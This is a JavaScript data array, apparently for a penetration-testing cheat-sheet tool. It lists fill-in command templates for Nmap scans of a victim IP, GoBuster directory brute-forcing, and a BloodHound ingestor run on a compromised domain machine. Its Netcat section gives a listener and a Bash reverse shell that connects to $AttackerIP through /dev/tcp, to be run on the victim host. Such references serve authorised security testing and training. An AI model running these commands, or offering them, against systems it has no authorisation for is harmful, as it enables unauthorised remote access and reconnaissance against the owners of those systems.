const commandsData = [
            {
                category: "Nmap",
                commands: [
                    { title: "Basic Scan", description: "A simple yet effective scan to find open ports and identify services.", template: "nmap -sV -sC -T4 $VictimIP" },
                    { title: "All Ports Scan", description: "Scans all 65,535 TCP ports. Can be slow, but is very thorough.", template: "nmap -p- -sV -sC -T4 $VictimIP" },
                    { title: "UDP Scan", description: "Scans for open UDP ports. Often overlooked in initial scans.", template: "nmap -sU --top-ports 20 $VictimIP" },
                    { title: "Aggressive Scan", description: "Enables OS detection, version detection, script scanning, and traceroute.", template: "nmap -A $VictimIP" }
                ]
            },
            {
                category: "Netcat",
                commands: [
                    { title: "Reverse Shell Listener", description: "Sets up a listener on your attacker machine to catch an incoming reverse shell.", template: "nc -nlvp $Port" },
                    { title: "Bash Reverse Shell", description: "Execute this on the victim machine to send a shell back to your listener.", template: "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$Port 0>&1'" }
                ]
            },
            {
                category: "GoBuster",
                commands: [
                    { title: "Directory Busting", description: "Find hidden directories on a web server using a wordlist.", template: "gobuster dir -u http://$VictimIP -w $Wordlist" },
                    { title: "File Busting with Extensions", description: "Look for specific file types (e.g., php, txt, sh) on a web server.", template: "gobuster dir -u http://$VictimIP -w $Wordlist -x php,txt,sh" }
                ]
            },
            {
                category: "BloodHound",
                commands: [
                    { title: "BloodHound Ingestor", description: "Run this on a compromised machine within an AD environment to collect data. Requires a domain user's credentials.", template: "./bloodhound.py -u USERNAME -p 'PASSWORD' -ns $VictimIP -d DOMAIN.LOCAL -c all" }
                ]
            }
        ];